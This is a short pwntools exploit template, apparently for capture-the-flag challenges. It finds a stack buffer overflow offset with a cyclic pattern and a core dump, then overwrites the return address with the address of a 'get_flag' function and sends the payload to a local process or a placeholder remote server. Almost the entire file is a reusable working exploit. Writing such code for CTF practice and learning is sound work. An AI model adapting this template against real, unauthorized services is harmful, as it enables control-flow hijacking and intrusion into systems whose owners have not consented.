from pwn import *

#getting flag address if there is a function that we need to jump to
static = ELF("<file>")
flag_address = p64(static.symbols['get_flag'])

#get overflow - start process and send 200 cyclic - increase if you need to n=8 for 64bit (8 bytes)
p = process("<file>")
p.sendline(cyclic(200,n=8))
p.wait()
core = p.corefile
buff = cyclic_find(core.read(core.rsp, 8), n=8)
p.close()

#create payload fill to overflow then drop the address for flag function
payload = b"A"*buff+flag_address

#local run
#binary = process("./jump")
#binary.sendline(payload)
#binary.interactive()

#remote run
target = remote('<server>',<port>)
target.sendline(payload)
target.interactive()
